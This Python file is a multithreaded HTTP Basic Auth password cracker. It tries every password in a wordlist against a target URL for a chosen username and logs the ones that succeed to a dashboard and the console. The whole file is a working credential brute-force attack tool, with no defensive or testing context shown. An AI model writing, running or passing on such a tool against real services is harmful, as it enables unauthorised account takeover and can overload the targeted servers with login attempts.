import requests
import threading
from utils.dashboard import LiveDashboard

dashboard = LiveDashboard()

class HTTPBasicAuthCracker:
    def __init__(self, target_url, username, wordlist):
        self.target_url = target_url
        self.username = username
        self.wordlist = wordlist
        self.lock = threading.Lock()

    def try_login(self, password):
        dashboard.log_attempt()
        try:
            response = requests.get(self.target_url, auth=(self.username, password), timeout=5)
            if response.status_code == 200:
                msg = f"{self.username}@{self.target_url} with password: {password}"
                dashboard.log_success(msg)
                with self.lock:
                    print(f"[+] SUCCESS: {msg}")
            else:
                with self.lock:
                    print(f"[-] Failed login for {self.username}:{password} (Status {response.status_code})")
        except Exception as e:
            with self.lock:
                print(f"[!] ERROR: {e}")

    def run(self):
        dashboard.start()
        with open(self.wordlist, 'r') as file:
            for line in file:
                password = line.strip()
                t = threading.Thread(target=self.try_login, args=(password,))
                t.start()
        dashboard.stop()
